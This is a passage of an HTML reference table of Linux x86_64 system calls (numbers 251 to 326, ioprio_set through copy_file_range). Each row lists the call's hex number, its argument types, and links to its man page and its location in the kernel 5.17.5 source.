href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioprio_set.2.html">sys_ioprio_set</a></td><td>0xfb</td><td>int which</td><td>int who</td><td>int ioprio</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/block/ioprio.c#L68">block&#x2F;ioprio.c:68</a></td></tr><tr><td>252</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioprio_get.2.html">sys_ioprio_get</a></td><td>0xfc</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/block/ioprio.c#L209">block&#x2F;ioprio.c:209</a></td></tr><tr><td>253</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_init.2.html">sys_inotify_init</a></td><td>0xfd</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/notify/inotify/inotify_user.c#L720">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c:720</a></td></tr><tr><td>254</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_add_watch.2.html">sys_inotify_add_watch</a></td><td>0xfe</td><td>int fd</td><td>const char __user *path</td><td>u32 mask</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/notify/inotify/inotify_user.c#L730">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c:730</a></td></tr><tr><td>255</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_rm_watch.2.html">sys_inotify_rm_watch</a></td><td>0xff</td><td>int fd</td><td>__s32 wd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/notify/inotify/inotify_user.c#L794">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c:794</a></td></tr><tr><td>256</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/migrate_pages.2.html">sys_migrate_pages</a></td><td>0x100</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long __user *from</td><td>const unsigned long __user *to</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mempolicy.c#L1679">mm&#x2F;mempolicy.c:1679</a></td></tr><tr><td>257</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/openat.2.html">sys_openat</a></td><td>0x101</td><td>int dfd</td><td>const char __user *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L1337">fs&#x2F;open.c:1337</a></td></tr><tr><td>258</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mkdirat.2.html">sys_mkdirat</a></td><td>0x102</td><td>int dfd</td><td>const char __user * pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4074">fs&#x2F;namei.c:4074</a></td></tr><tr><td>259</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mknodat.2.html">sys_mknodat</a></td><td>0x103</td><td>int dfd</td><td>const char __user * filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L3990">fs&#x2F;namei.c:3990</a></td></tr><tr><td>260</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchownat.2.html">sys_fchownat</a></td><td>0x104</td><td>int dfd</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L779">fs&#x2F;open.c:779</a></td></tr><tr><td>261</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/futimesat.2.html">sys_futimesat</a></td><td>0x105</td><td>int dfd</td><td>const char __user *filename</td><td>struct __kernel_old_timeval __user *utimes</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/utimes.c#L202">fs&#x2F;utimes.c:202</a></td></tr><tr><td>262</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newfstatat.2.html">sys_newfstatat</a></td><td>0x106</td><td>int dfd</td><td>const char __user *filename</td><td>struct stat __user *statbuf</td><td>int flag</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/stat.c#L431">fs&#x2F;stat.c:431</a></td></tr><tr><td>263</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unlinkat.2.html">sys_unlinkat</a></td><td>0x107</td><td>int dfd</td><td>const char __user * pathname</td><td>int flag</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4356">fs&#x2F;namei.c:4356</a></td></tr><tr><td>264</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/renameat.2.html">sys_renameat</a></td><td>0x108</td><td>int olddfd</td><td>const char __user * oldname</td><td>int newdfd</td><td>const char __user * newname</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4967">fs&#x2F;namei.c:4967</a></td></tr><tr><td>265</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/linkat.2.html">sys_linkat</a></td><td>0x109</td><td>int olddfd</td><td>const char __user *oldname</td><td>int newdfd</td><td>const char __user *newname</td><td>int flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4625">fs&#x2F;namei.c:4625</a></td></tr><tr><td>266</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/symlinkat.2.html">sys_symlinkat</a></td><td>0x10a</td><td>const char __user * oldname</td><td>int newdfd</td><td>const char __user * newname</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4444">fs&#x2F;namei.c:4444</a></td></tr><tr><td>267</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readlinkat.2.html">sys_readlinkat</a></td><td>0x10b</td><td>int dfd</td><td>const char __user *path</td><td>char __user *buf</td><td>int bufsiz</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/stat.c#L492">fs&#x2F;stat.c:492</a></td></tr><tr><td>268</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchmodat.2.html">sys_fchmodat</a></td><td>0x10c</td><td>int dfd</td><td>const char __user * filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L655">fs&#x2F;open.c:655</a></td></tr><tr><td>269</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/faccessat.2.html">sys_faccessat</a></td><td>0x10d</td><td>int dfd</td><td>const char __user *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L492">fs&#x2F;open.c:492</a></td></tr><tr><td>270</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pselect6.2.html">sys_pselect6</a></td><td>0x10e</td><td>int</td><td>fd_set __user *</td><td>fd_set __user *</td><td>fd_set __user *</td><td>struct __kernel_timespec __user *</td><td>void __user *</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/select.c#L795">fs&#x2F;select.c:795</a></td></tr><tr><td>271</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ppoll.2.html">sys_ppoll</a></td><td>0x10f</td><td>struct pollfd __user *</td><td>unsigned int</td><td>struct __kernel_timespec __user *</td><td>const sigset_t __user *</td><td>size_t</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/select.c#L1101">fs&#x2F;select.c:1101</a></td></tr><tr><td>272</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unshare.2.html">sys_unshare</a></td><td>0x110</td><td>unsigned long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/fork.c#L3262">kernel&#x2F;fork.c:3262</a></td></tr><tr><td>273</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_robust_list.2.html">sys_set_robust_list</a></td><td>0x111</td><td>struct robust_list_head __user *head</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/futex/syscalls.c#L29">kernel&#x2F;futex&#x2F;syscalls.c:29</a></td></tr><tr><td>274</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_robust_list.2.html">sys_get_robust_list</a></td><td>0x112</td><td>int pid</td><td>struct robust_list_head __user * __user *head_ptr</td><td>size_t __user *len_ptr</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/futex/syscalls.c#L49">kernel&#x2F;futex&#x2F;syscalls.c:49</a></td></tr><tr><td>275</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/splice.2.html">sys_splice</a></td><td>0x113</td><td>int fd_in</td><td>loff_t __user *off_in</td><td>int fd_out</td><td>loff_t __user *off_out</td><td>size_t len</td><td>unsigned int flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/splice.c#L1328">fs&#x2F;splice.c:1328</a></td></tr><tr><td>276</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tee.2.html">sys_tee</a></td><td>0x114</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/splice.c#L1694">fs&#x2F;splice.c:1694</a></td></tr><tr><td>277</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sync_file_range.2.html">sys_sync_file_range</a></td><td>0x115</td><td>int fd</td><td>loff_t offset</td><td>loff_t nbytes</td><td>unsigned int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/sync.c#L370">fs&#x2F;sync.c:370</a></td></tr><tr><td>278</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vmsplice.2.html">sys_vmsplice</a></td><td>0x116</td><td>int fd</td><td>const struct iovec __user *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/splice.c#L1292">fs&#x2F;splice.c:1292</a></td></tr><tr><td>279</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/move_pages.2.html">sys_move_pages</a></td><td>0x117</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void __user * __user *pages</td><td>const int __user *nodes</td><td>int __user *status</td><td>int flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/migrate.c#L2063">mm&#x2F;migrate.c:2063</a></td></tr><tr><td>280</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utimensat.2.html">sys_utimensat</a></td><td>0x118</td><td>int dfd</td><td>const char __user *filename</td><td>struct __kernel_timespec __user *utimes</td><td>int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/utimes.c#L147">fs&#x2F;utimes.c:147</a></td></tr><tr><td>281</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_pwait.2.html">sys_epoll_pwait</a></td><td>0x119</td><td>int epfd</td><td>struct epoll_event __user *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t __user *sigmask</td><td>size_t sigsetsize</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventpoll.c#L2299">fs&#x2F;eventpoll.c:2299</a></td></tr><tr><td>282</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signalfd.2.html">sys_signalfd</a></td><td>0x11a</td><td>int ufd</td><td>sigset_t __user *user_mask</td><td>size_t sizemask</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/signalfd.c#L314">fs&#x2F;signalfd.c:314</a></td></tr><tr><td>283</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_create.2.html">sys_timerfd_create</a></td><td>0x11b</td><td>int clockid</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/timerfd.c#L406">fs&#x2F;timerfd.c:406</a></td></tr><tr><td>284</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/eventfd.2.html">sys_eventfd</a></td><td>0x11c</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventfd.c#L463">fs&#x2F;eventfd.c:463</a></td></tr><tr><td>285</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fallocate.2.html">sys_fallocate</a></td><td>0x11d</td><td>int fd</td><td>int mode</td><td>loff_t offset</td><td>loff_t len</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L352">fs&#x2F;open.c:352</a></td></tr><tr><td>286</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_settime.2.html">sys_timerfd_settime</a></td><td>0x11e</td><td>int ufd</td><td>int flags</td><td>const struct __kernel_itimerspec __user *utmr</td><td>struct __kernel_itimerspec __user *otmr</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/timerfd.c#L558">fs&#x2F;timerfd.c:558</a></td></tr><tr><td>287</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_gettime.2.html">sys_timerfd_gettime</a></td><td>0x11f</td><td>int ufd</td><td>struct __kernel_itimerspec __user *otmr</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/timerfd.c#L576">fs&#x2F;timerfd.c:576</a></td></tr><tr><td>288</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/accept4.2.html">sys_accept4</a></td><td>0x120</td><td>int</td><td>struct sockaddr __user *</td><td>int __user *</td><td>int</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L1935">net&#x2F;socket.c:1935</a></td></tr><tr><td>289</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signalfd4.2.html">sys_signalfd4</a></td><td>0x121</td><td>int ufd</td><td>sigset_t __user *user_mask</td><td>size_t sizemask</td><td>int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/signalfd.c#L302">fs&#x2F;signalfd.c:302</a></td></tr><tr><td>290</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/eventfd2.2.html">sys_eventfd2</a></td><td>0x122</td><td>unsigned int count</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventfd.c#L458">fs&#x2F;eventfd.c:458</a></td></tr><tr><td>291</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_create1.2.html">sys_epoll_create1</a></td><td>0x123</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventpoll.c#L2032">fs&#x2F;eventpoll.c:2032</a></td></tr><tr><td>292</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup3.2.html">sys_dup3</a></td><td>0x124</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/file.c#L1249">fs&#x2F;file.c:1249</a></td></tr><tr><td>293</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pipe2.2.html">sys_pipe2</a></td><td>0x125</td><td>int __user *fildes</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/pipe.c#L1026">fs&#x2F;pipe.c:1026</a></td></tr><tr><td>294</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_init1.2.html">sys_inotify_init1</a></td><td>0x126</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/notify/inotify/inotify_user.c#L720">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c:720</a></td></tr><tr><td>295</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/preadv.2.html">sys_preadv</a></td><td>0x127</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1053">fs&#x2F;read_write.c:1053</a></td></tr><tr><td>296</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwritev.2.html">sys_pwritev</a></td><td>0x128</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1073">fs&#x2F;read_write.c:1073</a></td></tr><tr><td>297</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_tgsigqueueinfo.2.html">sys_rt_tgsigqueueinfo</a></td><td>0x129</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t __user *uinfo</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L4036">kernel&#x2F;signal.c:4036</a></td></tr><tr><td>298</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/perf_event_open.2.html">sys_perf_event_open</a></td><td>0x12a</td><td>struct perf_event_attr __user *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/events/core.c#L12212">kernel&#x2F;events&#x2F;core.c:12212</a></td></tr><tr><td>299</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvmmsg.2.html">sys_recvmmsg</a></td><td>0x12b</td><td>int fd</td><td>struct mmsghdr __user *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>struct __kernel_timespec __user *timeout</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2932">net&#x2F;socket.c:2932</a></td></tr><tr><td>300</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fanotify_init.2.html">sys_fanotify_init</a></td><td>0x12c</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/notify/fanotify/fanotify_user.c#L1344">fs&#x2F;notify&#x2F;fanotify&#x2F;fanotify_user.c:1344</a></td></tr><tr><td>301</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fanotify_mark.2.html">sys_fanotify_mark</a></td><td>0x12d</td><td>int fanotify_fd</td><td>unsigned int flags</td><td>u64 mask</td><td>int fd</td><td>const char __user *pathname</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/notify/fanotify/fanotify_user.c#L1822">fs&#x2F;notify&#x2F;fanotify&#x2F;fanotify_user.c:1822</a></td></tr><tr><td>302</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/prlimit64.2.html">sys_prlimit64</a></td><td>0x12e</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 __user *new_rlim</td><td>struct rlimit64 __user *old_rlim</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1664">kernel&#x2F;sys.c:1664</a></td></tr><tr><td>303</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/name_to_handle_at.2.html">sys_name_to_handle_at</a></td><td>0x12f</td><td>int dfd</td><td>const char __user *name</td><td>struct file_handle __user *handle</td><td>int __user *mnt_id</td><td>int flag</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/fhandle.c#L93">fs&#x2F;fhandle.c:93</a></td></tr><tr><td>304</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/open_by_handle_at.2.html">sys_open_by_handle_at</a></td><td>0x130</td><td>int mountdirfd</td><td>struct file_handle __user *handle</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/fhandle.c#L256">fs&#x2F;fhandle.c:256</a></td></tr><tr><td>305</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_adjtime.2.html">sys_clock_adjtime</a></td><td>0x131</td><td>clockid_t which_clock</td><td>struct __kernel_timex __user *tx</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-timers.c#L1121">kernel&#x2F;time&#x2F;posix-timers.c:1121</a></td></tr><tr><td>306</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/syncfs.2.html">sys_syncfs</a></td><td>0x132</td><td>int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/sync.c#L149">fs&#x2F;sync.c:149</a></td></tr><tr><td>307</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendmmsg.2.html">sys_sendmmsg</a></td><td>0x133</td><td>int fd</td><td>struct mmsghdr __user *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2648">net&#x2F;socket.c:2648</a></td></tr><tr><td>308</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setns.2.html">sys_setns</a></td><td>0x134</td><td>int fd</td><td>int nstype</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/nsproxy.c#L527">kernel&#x2F;nsproxy.c:527</a></td></tr><tr><td>309</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getcpu.2.html">sys_getcpu</a></td><td>0x135</td><td>unsigned __user *cpu</td><td>unsigned __user *node</td><td>struct getcpu_cache __user *cache</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L2636">kernel&#x2F;sys.c:2636</a></td></tr><tr><td>310</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/process_vm_readv.2.html">sys_process_vm_readv</a></td><td>0x136</td><td>pid_t pid</td><td>const struct iovec __user *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec __user *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/process_vm_access.c#L291">mm&#x2F;process_vm_access.c:291</a></td></tr><tr><td>311</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/process_vm_writev.2.html">sys_process_vm_writev</a></td><td>0x137</td><td>pid_t pid</td><td>const struct iovec __user *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec __user *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/process_vm_access.c#L298">mm&#x2F;process_vm_access.c:298</a></td></tr><tr><td>312</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kcmp.2.html">sys_kcmp</a></td><td>0x138</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/kcmp.c#L135">kernel&#x2F;kcmp.c:135</a></td></tr><tr><td>313</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/finit_module.2.html">sys_finit_module</a></td><td>0x139</td><td>int fd</td><td>const char __user *uargs</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/module/main.c#L2916">kernel&#x2F;module&#x2F;main.c:2916</a></td></tr><tr><td>314</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setattr.2.html">sys_sched_setattr</a></td><td>0x13a</td><td>pid_t pid</td><td>struct sched_attr __user *attr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L7883">kernel&#x2F;sched&#x2F;core.c:7883</a></td></tr><tr><td>315</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getattr.2.html">sys_sched_getattr</a></td><td>0x13b</td><td>pid_t pid</td><td>struct sched_attr __user *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L8036">kernel&#x2F;sched&#x2F;core.c:8036</a></td></tr><tr><td>316</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/renameat2.2.html">sys_renameat2</a></td><td>0x13c</td><td>int olddfd</td><td>const char __user *oldname</td><td>int newdfd</td><td>const char __user *newname</td><td>unsigned int flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4960">fs&#x2F;namei.c:4960</a></td></tr><tr><td>317</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/seccomp.2.html">sys_seccomp</a></td><td>0x13d</td><td>unsigned int op</td><td>unsigned int flags</td><td>void __user *uargs</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/seccomp.c#L2007">kernel&#x2F;seccomp.c:2007</a></td></tr><tr><td>318</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getrandom.2.html">sys_getrandom</a></td><td>0x13e</td><td>char __user *buf</td><td>size_t count</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/drivers/char/random.c#L1270">drivers&#x2F;char&#x2F;random.c:1270</a></td></tr><tr><td>319</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/memfd_create.2.html">sys_memfd_create</a></td><td>0x13f</td><td>const char __user *uname_ptr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/memfd.c#L266">mm&#x2F;memfd.c:266</a></td></tr><tr><td>320</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kexec_file_load.2.html">sys_kexec_file_load</a></td><td>0x140</td><td>int kernel_fd</td><td>int initrd_fd</td><td>unsigned long cmdline_len</td><td>const char __user *cmdline_ptr</td><td>unsigned long flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/kexec_file.c#L325">kernel&#x2F;kexec_file.c:325</a></td></tr><tr><td>321</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/bpf.2.html">sys_bpf</a></td><td>0x141</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/bpf/syscall.c#L5067">kernel&#x2F;bpf&#x2F;syscall.c:5067</a></td></tr><tr><td>322</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execveat.2.html">sys_execveat</a></td><td>0x142</td><td>int dfd</td><td>const char __user *filename</td><td>const char __user *const __user *argv</td><td>const char __user *const __user *envp</td><td>int flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/exec.c#L2095">fs&#x2F;exec.c:2095</a></td></tr><tr><td>323</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/userfaultfd.2.html">sys_userfaultfd</a></td><td>0x143</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/userfaultfd.c#L2134">fs&#x2F;userfaultfd.c:2134</a></td></tr><tr><td>324</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/membarrier.2.html">sys_membarrier</a></td><td>0x144</td><td>int cmd</td><td>unsigned int flags</td><td>int cpu_id</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/membarrier.c#L579">kernel&#x2F;sched&#x2F;membarrier.c:579</a></td></tr><tr><td>325</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mlock2.2.html">sys_mlock2</a></td><td>0x145</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mlock.c#L619">mm&#x2F;mlock.c:619</a></td></tr><tr><td>326</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/copy_file_range.2.html">sys_copy_file_range</a></td><td>0x146</td><td>int fd_in</td><td>loff_t __user *off_in</td><td>int fd_out</td><td>loff_t __user *off_out</td><td>size_t len</td><td>unsigned int flags</td><td><a 